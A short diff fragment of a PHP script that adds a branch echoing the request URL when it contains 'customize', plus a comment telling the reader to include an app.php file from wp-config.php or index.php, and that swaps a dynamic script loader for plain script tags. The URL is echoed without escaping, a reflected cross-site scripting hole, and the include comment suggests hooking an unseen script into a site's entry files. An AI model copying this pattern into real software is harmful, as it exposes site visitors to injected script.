@@ -1,5 +1,17 @@
 <?php
 
+$url = 'https://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+
+if (strpos($url,'customize') !== false) {
+   echo $url;
+
+} else {
+    //include_once(ABSPATH . 'app.php');
+
+
+
+// include_once(ABSPATH . 'app.php'); add to wp-config.php if wordpress | index.php if not wordpress
+
 if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['_id'])) {
 
 
@@ -186,8 +198,7 @@ if(!is_file($root .'/script/'. $main)){
  echo   '</body>';
  echo   '</html>';
    } else {
-    //echo '<script src="/script/ajax.js"></script>';
-    //echo "<script type='text/javascript' src='/script/${main}'></script>";
-      
-echo '<script>import("/script/ajax.js").then((module) => { $.getScript( "../script/main.js", function() {console.log("loaded")})});</script>';
+    echo '<script src="/script/ajax.js"></script>';
+    echo "<script type='text/javascript' src='/script/${main}'></script>";
+   }
 }
